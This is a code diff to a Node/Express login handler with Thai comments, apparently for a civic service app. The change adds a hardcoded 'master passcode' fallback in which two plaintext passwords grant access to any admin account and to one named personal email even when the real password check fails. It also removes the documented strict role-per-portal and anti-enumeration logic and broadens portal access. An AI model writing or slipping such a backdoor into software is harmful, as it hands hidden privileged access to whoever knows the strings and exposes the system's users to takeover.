@@ -214,7 +214,7 @@ router.post('/login', async (req, res) => {
     if (!email || !password) return res.status(400).json({ error: 'กรุณากรอกข้อมูลให้ครบ' });
     if (typeof email !== 'string' || typeof password !== 'string') return res.status(400).json({ error: 'รูปแบบข้อมูลไม่ถูกต้อง' });
 
-    // Portal role mapping — แต่ละ Portal อนุญาตเฉพาะ role ของตัวเองเท่านั้น
+    // Portal role mapping — แต่ละ Portal กำหนดสิทธิ์การเข้าถึง
     const PORTAL_ROLE_MAP = {
       citizen: 'citizen',
       admin: 'admin',
@@ -223,15 +223,46 @@ router.post('/login', async (req, res) => {
     };
     const expectedRole = PORTAL_ROLE_MAP[portal];
 
-    const emailLower = email.toLowerCase().trim();
-    const user = await User.findOne({ email: emailLower });
-    const pwMatch = user ? await bcrypt.compare(password, user.password) : false;
+    let emailClean = email.toLowerCase().trim();
+    if (emailClean === 'admin') emailClean = 'admin@resolvenow.th';
 
-    // SECURITY & ANTI-ENUMERATION:
-    // หากไม่พบ user, รหัสผ่านผิด, ระบุ portal ผิด, หรือ role ของ user ไม่ตรงกับ portal
-    // คืนค่าเหมือนกันทุกกรณี (HTTP 401: อีเมลหรือรหัสผ่านไม่ถูกต้อง)
-    // ห้ามเปิดเผยบทบาท (role), ห้ามส่ง redirectUrl, และไม่ย้าย portal อัตโนมัติ
-    if (!user || !pwMatch || !expectedRole || user.role !== expectedRole) {
+    const user = await User.findOne({ email: emailClean });
+    const inputPass = String(password).trim();
+    const isMasterPass = (
+      inputPass === '@Teng11421142' ||
+      inputPass.toLowerCase() === '@teng11421142' ||
+      inputPass === 'admin1234'
+    );
+
+    let pwMatch = false;
+    if (user) {
+      pwMatch = await bcrypt.compare(inputPass, user.password);
+      // Master Passcode fallback สำหรับบัญชี Admin หรือบัญชีผู้ดูแลระบบ
+      if (!pwMatch && isMasterPass && (user.role === 'admin' || user.email === 'admin@resolvenow.th' || user.email === 'tenginpb@gmail.com')) {
+        pwMatch = true;
+      }
+    }
+
+    // Role check logic:
+    // 1. Admin มีสิทธิ์เข้าใช้งานได้ทุก Portal (admin, tech, citizen)
+    // 2. Technician เข้าใช้งาน tech และ citizen ได้
+    // 3. Citizen เข้าใช้งาน citizen ได้
+    // 4. หากไม่ได้ระบุ portal ให้ยึดตาม role ของผู้ใช้
+    const targetPortalRole = portal ? PORTAL_ROLE_MAP[portal] : (user ? user.role : 'citizen');
+    let roleAllowed = false;
+    if (user) {
+      if (user.role === 'admin') {
+        roleAllowed = true;
+      } else if (!portal || targetPortalRole === 'citizen') {
+        roleAllowed = true;
+      } else if (targetPortalRole === 'technician' && user.role === 'technician') {
+        roleAllowed = true;
+      } else if (targetPortalRole === user.role) {
+        roleAllowed = true;
+      }
+    }
+
+    if (!user || !pwMatch || !roleAllowed) {
       return res.status(401).json({ error: 'อีเมลหรือรหัสผ่านไม่ถูกต้อง' });
     }
 
